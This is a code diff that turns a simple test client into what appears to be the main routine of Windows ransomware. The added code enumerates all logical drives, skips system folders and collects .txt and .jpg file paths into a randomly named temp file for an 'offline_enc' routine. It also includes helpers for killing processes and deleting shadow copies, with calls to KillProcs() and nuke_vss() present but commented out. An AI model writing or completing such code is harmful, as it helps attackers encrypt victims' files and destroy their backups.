@@ -1,42 +1,55 @@
 #include <iostream>
 #include <Windows.h>
-#include "Communication/sendrequest.h"
+#include "Core/disk_id.h"
+#include "Core/file_search.h"
+#include "Helpers/convert_to_wstring.h"
+#include "Helpers/save_results.h"
+#include "Helpers/gen_str.h"
+#include "Helpers/kill_procs.h"
+#include "Helpers/del_shadows.h"
+
+
+int offline_enc();
+int online_enc();
+
+
 
 int main() {
-    nlohmann::json jsonData;
-    jsonData["data"] = "Hello, World!";
+    offline_enc();
 
-    // Call your function
-    std::wstring url = L"http://10.0.0.113:3000/jsoncpp.php";
-    std::string response = sendrequest(url, jsonData);
+    return 0;
+}
 
-    // Check the response
-    std::cout << "Response: " << response << std::endl;
 
-    // Check if the response is valid JSON
-    try {
-        nlohmann::json jsonResponse = nlohmann::json::parse(response);
+int offline_enc() {
+    // identify all drives
+    std::map<std::string, std::vector<std::wstring>> drives = Disk_ID();
+    // store all logical drives to an array
+    std::vector<std::wstring> logicalDrives = drives["logical"];
 
-        // Check if the response is of reasonable length
-        if (response.length() < 1000) { // adjust this number based on your needs
+    // generate a unique wstring:
+    std::string randomTempStr = gen_str(8);
+    std::wstring randomWStr(randomTempStr.begin(), randomTempStr.end());
 
-            // Check if the "response" key is in the JSON response
-            if (jsonResponse.find("response") != jsonResponse.end()) {
-                std::cout << "Response is valid" << std::endl;
-            }
-            else {
-                std::cout << "Response does not contain 'response' key" << std::endl;
-            }
+    // path to temp directory
+    WCHAR tempPath[MAX_PATH];
+    GetTempPath(MAX_PATH, tempPath);
+    std::wstring wstrTempPath(tempPath);
+    // path to a text file for storing file paths
+    std::wstring filePath = wstrTempPath + L"\\" + randomWStr + L".txt";
 
-        }
-        else {
-            std::cout << "Response is too long" << std::endl;
-        }
+    // search for files in each drive & ignore forbidden folders 
+    std::vector<std::wstring> fileTypes = { L".txt", L".jpg" };
+    std::unordered_set<std::wstring> forbiddenDirs = { L"System Volume Information", L"Windows", L"Program Files", L"Users", 
+                                                        L"PerfLogs", L"Recovery", L"Path", L"Program Files (x86)", L"$Recycle.Bin"};
 
+    for (const auto& drive : logicalDrives) {
+        std::vector<std::wstring> files = FileSearcher(drive, fileTypes, forbiddenDirs);
+        SaveResultsToFile(filePath, files); 
     }
-    catch (nlohmann::json::parse_error&) {
-        std::cout << "Response is not valid JSON" << std::endl;
-    }
+    
+    // KillProcs();
+    // nuke_vss();
 
     return 0;
 }
